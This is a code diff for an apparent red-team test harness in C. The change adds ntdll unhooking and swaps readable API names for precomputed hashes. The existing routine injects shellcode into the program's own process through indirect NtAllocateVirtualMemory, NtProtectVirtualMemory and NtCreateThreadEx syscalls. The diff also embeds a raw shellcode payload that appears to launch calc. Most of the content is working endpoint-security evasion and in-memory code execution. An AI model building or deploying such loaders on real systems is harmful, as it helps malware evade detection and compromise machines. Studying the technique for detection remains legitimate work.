@@ -8,6 +8,8 @@
 #include "syscall.c"
 #include "syscallresolve.c"
 #include "dump.c"
+#include "unhook.c"
+#include "hashes.h"
 
 
 #define MEM_COMMIT 0x1000
@@ -32,12 +34,12 @@ void print_debugf(const char* format, ...) {
 bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_size) {
     print_debug("starting self-injection process");
 
-    uint16_t nt_alloc_num = get_syscall_number(get_hash("NtAllocateVirtualMemory"));
-    uint16_t nt_write_num = get_syscall_number(get_hash("NtWriteVirtualMemory"));
-    uint16_t nt_protect_num = get_syscall_number(get_hash("NtProtectVirtualMemory"));
-    uint16_t nt_create_thread_num = get_syscall_number(get_hash("NtCreateThreadEx"));
-    uint16_t nt_wait_num = get_syscall_number(get_hash("NtWaitForSingleObject"));
-    uint16_t nt_close_num = get_syscall_number(get_hash("NtClose"));
+    uint16_t nt_alloc_num = get_syscall_number(H_ALLCTVR);         // NtAllocateVirtualMemory
+    uint16_t nt_write_num = get_syscall_number(H_WRTVRTL);         // NtWriteVirtualMemory
+    uint16_t nt_protect_num = get_syscall_number(H_PRTCTVR);       // NtProtectVirtualMemory
+    uint16_t nt_create_thread_num = get_syscall_number(H_CRTTHRD1); // NtCreateThreadEx
+    uint16_t nt_wait_num = get_syscall_number(H_WTFRSNG);          // NtWaitForSingleObject
+    uint16_t nt_close_num = get_syscall_number(H_CLSE);            // NtClose
 
     if (nt_alloc_num == 0xFFFF || nt_write_num == 0xFFFF || nt_protect_num == 0xFFFF || 
         nt_create_thread_num == 0xFFFF || nt_wait_num == 0xFFFF || nt_close_num == 0xFFFF) {
@@ -61,7 +63,7 @@ bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_s
     };
     uintptr_t status = indirect_syscall(nt_alloc_num, alloc_args, 6);
     if (status != 0) {
-        print_debugf("ntallocatevirtualmemory failed with status: 0x%lx", status);
+        print_debugf("alloc failed with status: 0x%lx", status);
         return false;
     }
     print_debugf("allocated %zu bytes at 0x%p", size, base_address);
@@ -76,7 +78,7 @@ bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_s
     };
     status = indirect_syscall(nt_write_num, write_args, 5);
     if (status != 0) {
-        print_debugf("ntwritevirtualmemory failed with status: 0x%lx", status);
+        print_debugf("write failed with status: 0x%lx", status);
         return false;
     }
     print_debugf("wrote %zu bytes of shellcode", bytes_written);
@@ -91,7 +93,7 @@ bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_s
     };
     status = indirect_syscall(nt_protect_num, protect_args, 5);
     if (status != 0) {
-        print_debugf("ntprotectvirtualmemory failed with status: 0x%lx", status);
+        print_debugf("protect failed with status: 0x%lx", status);
         return false;
     }
     print_debug("changed memory protection to page_execute_read");
@@ -100,9 +102,9 @@ bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_s
     uintptr_t create_thread_args[] = {
         (uintptr_t)&thread_handle,
         THREAD_ALL_ACCESS,
-        0, // ObjectAttributes
+        0,
         (uintptr_t)current_process,
-        (uintptr_t)base_address, // StartAddress
+        (uintptr_t)base_address,
         0, // Argument
         0, // CreateFlags
         0, // ZeroBits
@@ -112,20 +114,20 @@ bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_s
     };
     status = indirect_syscall(nt_create_thread_num, create_thread_args, 11);
     if (status != 0) {
-        print_debugf("ntcreatethreadex failed with status: 0x%lx", status);
+        print_debugf("create thread failed with status: 0x%lx", status);
         return false;
     }
     print_debugf("thread created with handle: 0x%p", thread_handle);
 
     LARGE_INTEGER timeout;
-    timeout.QuadPart = -100000000; // 10 seconds
+    timeout.QuadPart = -100000000;
     uintptr_t wait_args[] = {
         (uintptr_t)thread_handle,
         FALSE,
         (uintptr_t)&timeout
     };
     status = indirect_syscall(nt_wait_num, wait_args, 3);
-    print_debugf("ntwaitforsingleobject completed with status: 0x%lx", status);
+    print_debugf("wait completed with status: 0x%lx", status);
 
     uintptr_t close_args[] = { (uintptr_t)thread_handle };
     indirect_syscall(nt_close_num, close_args, 1);
@@ -137,7 +139,13 @@ bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_s
 int main(int argc, char* argv[]) {
     printf("[+] syshash c implementation test [+]\n");
     
+    if (argc == 1) {
+        printf("[+] available flags: -debug (verbose output), -dump (export functions), -unhook (unhook ntdll) [+]\n");
+        printf("[+] flags can be combined, e.g., -debug -unhook [+]\n");
+    }
+    
     bool dump_mode = false;
+    bool unhook_mode = false;
     
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "-debug") == 0) {
@@ -146,6 +154,9 @@ int main(int argc, char* argv[]) {
         } else if (strcmp(argv[i], "-dump") == 0) {
             dump_mode = true;
             print_debug("dump mode enabled");
+        } else if (strcmp(argv[i], "-unhook") == 0) {
+            unhook_mode = true;
+            print_debug("unhook mode enabled");
         }
     }
     
@@ -203,6 +214,34 @@ int main(int argc, char* argv[]) {
         return (syscall_success && functions_success) ? 0 : 1;
     }
 
+    if (unhook_mode) {
+        printf("[+] starting ntdll unhooking process [+]\n");
+        
+        if (unhook_ntdll()) {
+            printf("[+] success: ntdll unhooking completed [+]\n");
+            printf("[+] process is now running with unhooked ntdll [+]\n");
+            printf("[+] press ctrl+c to exit or wait indefinitely... [+]\n");
+            
+            while (1) {
+                Sleep(5000);
+                if (debug_is_enabled()) {
+                    printf("[+] process still running with unhooked ntdll... [+]\n");
+                }
+            }
+        } else {
+            printf("[+] failed: ntdll unhooking failed [+]\n");
+            if (!debug_is_enabled()) {
+                printf("[+] run with -debug for more details [+]\n");
+            }
+            
+            cleanup_syscall_cache();
+            cleanup_ntdll_cache();
+            obf_cleanup();
+            
+            return 1;
+        }
+    }
+
     unsigned char shellcode[] = 
         "\x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54"
         "\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76"
@@ -212,20 +251,26 @@ int main(int argc, char* argv[]) {
         "\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4"
         "\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3";
 
-    printf("[+] attempting to inject shellcode... [+]\n");
-    if (nt_inject_self_shellcode(shellcode, sizeof(shellcode) - 1)) {
-        printf("[+] success: shellcode injection routine completed [+]\n");
-    } else {
-        printf("[+] failed: shellcode injection routine failed [+]\n");
-        if (!debug_is_enabled()) {
-            printf("[+] run with -debug for more details or -dump to see ntdll functions [+]\n");
+    if (!dump_mode && !unhook_mode) {
+        printf("[+] attempting to inject shellcode... [+]\n");
+        if (nt_inject_self_shellcode(shellcode, sizeof(shellcode) - 1)) {
+            printf("[+] success: shellcode injection routine completed [+]\n");
+        } else {
+            printf("[+] failed: shellcode injection routine failed [+]\n");
+            if (!debug_is_enabled()) {
+                printf("[+] run with -debug for more details, -dump to see ntdll functions, or -unhook to test unhooking [+]\n");
+            }
         }
+    } else if (!unhook_mode) { // wtf am i doing i hate c
     }
 
-    cleanup_syscall_cache();
-    cleanup_ntdll_cache();
-    obf_cleanup();
+    if (!unhook_mode) {
+        cleanup_syscall_cache();
+        cleanup_ntdll_cache();
+        obf_cleanup();
+        
+        printf("\n[+] test complete [+]\n");
+    }
     
-    printf("\n[+] test complete [+]\n");
     return 0;
 } 
